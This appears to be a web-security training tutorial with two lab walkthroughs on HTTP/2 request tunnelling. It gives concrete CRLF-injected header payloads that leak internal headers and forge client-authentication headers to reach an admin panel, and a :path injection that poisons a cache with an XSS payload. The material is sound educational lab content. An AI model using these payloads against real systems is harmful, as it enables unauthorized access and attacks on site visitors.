# HTTP request tunnelling

Request tunnelling is possible with both HTTP/1 and HTTP/2 but is considerably more difficult to detect in HTTP/1-only environments. Due to the way persistent (keep-alive) connections work in HTTP/1, even if you do receive two responses, this doesn't necessarily confirm that the request was successfully smuggled.

In HTTP/2 on the other hand, each "stream" should only ever contain a single request and response. If you receive an HTTP/2 response with what appears to be an HTTP/1 response in the body, you can be confident that you've successfully tunneled a second request.

## Leaking internal headers via HTTP/2 request tunnelling

    ```
    :method	POST
    :path	/comment
    :authority	vulnerable-website.com
    content-type	application/x-www-form-urlencoded
    foo	
    bar\r\n
    Content-Length: 200\r\n
    \r\n
    comment=
    x=1
    ```

In this case, both the front-end and back-end agree that there is only one request. What's interesting is that they can be made to disagree on where the headers end.

The front-end sees everything we've injected as part of a header, so adds any new headers after the trailing comment= string. On the other hand, the back-end sees the \r\n\r\n sequence and thinks this is the end of the headers. The comment= string, along with the internal headers, are treated as part of the body. The result is a comment parameter with the internal headers as its value.

```
POST /comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

comment=X-Internal-Header: secretContent-Length: 3
x=1
```

### Bypassing access controls via HTTP/2 request tunnelling

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming header names. To solve the lab, access the admin panel at /admin as the administrator user and delete carlos.

The front-end server doesn't reuse the connection to the back-end, so isn't vulnerable to classic request smuggling attacks. However, it is still vulnerable to request tunnelling.

**Solution**

1. Send the *GET /* request to Burp Repeater. Expand the Inspector's **Request Attributes** section and change the protocol to HTTP/2.
2. Using the Inspector, append an arbitrary header to the end of the request and try smuggling a Host header in its name as follows:

    **Name**
    ```
    foo: bar\r\n
    Host: abc
    ```
    **Value**
    ```
    xyz
    ```

Observe that the error response indicates that the server processes your injected host, confirming that the lab is vulnerable to CRLF injection via header names.
3. In the browser, notice that the lab's search function reflects your search query in the response. Send the most recent *GET /?search=YOUR-SEARCH-QUERY* request to Burp Repeater and upgrade it to an HTTP/2 request.
4. In Burp Repeater, right-click on the request and select **Change request method**. Send the request and notice that the search function still works when you send the search parameter in the body of a POST request.
5. Add an arbitrary header and use its name field to inject a large *Content-Length* header and an additional search parameter as follows:


    **Name**
    ```
    foo: bar\r\n
    Content-Length: 500\r\n
    \r\n
    search=x
    ```
    ***Value***
    ```
    xyz
    ```

6. In the main body of the request (in the message editor panel) append arbitrary characters to the original search parameter until the request is longer than the smuggled *Content-Length* header.
7. Send the request and observe that the response now reflects the headers that were appended to your request by the front-end server:

    ```
    0 search results for 'x: xyz
    Content-Length: 644
    cookie: session=74igyW8w7iNcBNGvT4Pd637XV4J1dojd
    X-SSL-VERIFIED: 0
    X-SSL-CLIENT-CN: null
    X-FRONTEND-KEY: 2717912335215199
    ```

    Notice that these appear to be headers used for client authentication.
8. Change the request method to HEAD and edit your malicious header so that it smuggles a request for the admin panel. Include the three client authentication headers, making sure to update their values as follows:


    **Name**
    ```
    foo: bar\r\n
    \r\n
    GET /admin HTTP/1.1\r\n
    X-SSL-VERIFIED: 1\r\n
    X-SSL-CLIENT-CN: administrator\r\n
    X-FRONTEND-KEY: 2717912335215199\r\n
    \r\n
    ```
    **Value**
    ```
    xyz
    ```

9. Send the request and observe that you receive an error response saying that not enough bytes were received. This is because the *Content-Length* of the requested resource is longer than the tunnelled response you're trying to read.
10. Change the *:path* pseudo-header so that it points to an endpoint that returns a shorter resource. In this case, you can use */login*.
11. Send the request again. You should see the start of the tunnelled HTTP/1.1 response nested in the body of your main response.
12. In the response, find the URL for deleting Carlos (*/admin/delete?username=carlos*), then update the path in your tunnelled request accordingly and resend it. Although you will likely encounter an error response, Carlos is deleted and the lab is solved.

## Web cache poisoning via HTTP/2 request tunnelling

### Web cache poisoning  via HTTP/2 request tunnelling

This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and doesn't consistently sanitize incoming headers.

To solve the lab, poison the cache in such a way that when the victim visits the home page, their browser executes alert(1). A victim user will visit the home page every 15 seconds.

**Solution**

1. Send a request for *GET /* to Burp Repeater. Expand the Inspector's **Request Attributes** section and change the protocol to HTTP/2.
2. Using the Inspector, try smuggling an arbitrary header in the :path pseudo-header, making sure to preserve a valid request line for the downgraded request as follows:


    **Name**
    ```
    :path
    ```
    **Value**
    ```
    /?cachebuster=1 HTTP/1.1\r\n
    Foo: bar
    ```

    Observe that you still receive a normal response, confirming that you're able to inject via the *:path*.
3. Change the request method to HEAD and use the :path pseudo-header to tunnel a request for another arbitrary endpoint as follows:


    **Name**
    ```
    :path
    ```
    **Value**
    ```
    /?cachebuster=2 HTTP/1.1\r\n
    Host: ac891ff81ee45e17c000500e0000006b.web-security-academy.net\r\n
    \r\n
    GET /post?postId=1 HTTP/1.1\r\n
    Foo: bar
    ```

    Note that we've ensured that the main request is valid by including a Host header before the split. We've also left an arbitrary trailing header to capture the HTTP/1.1 suffix that will be appended to the request line by the front-end during rewriting.
4. Send the request and observe that you are able to view the tunnelled response. If you can't, try using a different *postId*.
5. Remove everything except the path and cachebuster query parameter from the *:path* pseudo-header and resend the request. Observe that you have successfully poisoned the cache with the tunnelled response.
6. Now you need to find a gadget that reflects an HTML-based XSS payload without encoding or escaping it. Send a response for *GET /resources* and observe that this triggers a redirect to */resources/*.
7. Try tunnelling this request via the *:path* pseudo-header, including an XSS payload in the query string as follows.


    **Name**
    ```
    :path
    ```
    **Value**
    ```
    /?cachebuster=3 HTTP/1.1\r\n
    Host: ac891ff81ee45e17c000500e0000006b.web-security-academy.net\r\n
    \r\n
    GET /resources?<script>alert(1)</script> HTTP/1.1\r\n
    Foo: bar
    ```

    Observe that the request times out. This is because the *Content-Length* header in the main response is longer than the nested response to your tunnelled request.
8. From the proxy history, check the *Content-Length* in the response to a normal *GET /* request and make a note of its value. Go back to your malicious request in Burp Repeater and add enough arbitrary characters after the closing *</script>* tag to pad your reflected payload so that the length of the tunnelled response will exceed the *Content-Length* you just noted.
9. Send the request and confirm that your payload is successfully reflected in the tunnelled response. If you still encounter a timeout, you may not have added enough padding.
10. While the cache is still poisoned, visit the home page using the same cachebuster query parameter and confirm that the *alert()* fires.
11. In the Inspector, remove the cachebuster from your request and resend it until you have poisoned the cache. Keep resending the request every 5 seconds or so to keep the cache poisoned until the victim visits the home page and the lab is solved.